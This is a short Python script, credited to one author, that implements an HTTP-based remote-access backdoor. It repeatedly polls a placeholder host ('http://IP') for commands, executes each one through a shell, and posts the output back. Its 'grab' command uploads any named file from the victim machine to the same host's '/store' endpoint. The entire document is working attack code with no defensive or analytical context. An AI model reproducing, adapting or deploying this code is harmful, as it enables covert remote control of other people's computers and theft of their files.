#By Salah Baddou


import requests 
import subprocess 
import os
import time


while True: 

    req = requests.get('http://IP')
    command = req.text
        
    if 'terminate' in command:
        break # end the loop



    elif 'grab' in command:
        
        grab,path=command.split('*') # split the received grab command into two parts and store the second part in path variable
        
        if os.path.exists(path): # check if the file is there
            
            url = 'http://IP/store'  # Appended /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
            
        else:
            post_response = requests.post(url='http://IP', data='[-] Not able to find the file !' )
            
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://IP', data=CMD.stdout.read() )
        post_response = requests.post(url='http://IP', data=CMD.stderr.read() )

    time.sleep(3)
    



